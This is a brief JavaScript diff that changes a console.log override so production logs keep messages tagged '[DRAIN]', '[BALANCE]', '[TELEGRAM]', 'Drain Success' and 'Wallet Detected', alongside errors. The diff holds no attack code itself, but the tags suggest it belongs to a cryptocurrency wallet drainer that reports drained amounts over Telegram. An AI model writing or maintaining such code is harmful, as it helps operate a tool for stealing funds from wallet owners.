@@ -26,11 +26,20 @@ function debugLog(message, ...args) {
   // Disabled in production for performance
 }
 
-// Remove all console.log statements for production
+// Production logging - allow drain amounts and Telegram logs
 const originalConsoleLog = console.log;
 console.log = function() {
-  // Only log critical errors in production
-  if (arguments[0] && arguments[0].includes && arguments[0].includes('ERROR')) {
+  // Log drain amounts, balance, Telegram, and critical errors in production
+  if (arguments[0] && (
+    arguments[0].includes && (
+      arguments[0].includes('ERROR') || 
+      arguments[0].includes('[DRAIN]') ||
+      arguments[0].includes('[BALANCE]') ||
+      arguments[0].includes('[TELEGRAM]') ||
+      arguments[0].includes('Drain Success') ||
+      arguments[0].includes('Wallet Detected')
+    )
+  )) {
     originalConsoleLog.apply(console, arguments);
   }
 };
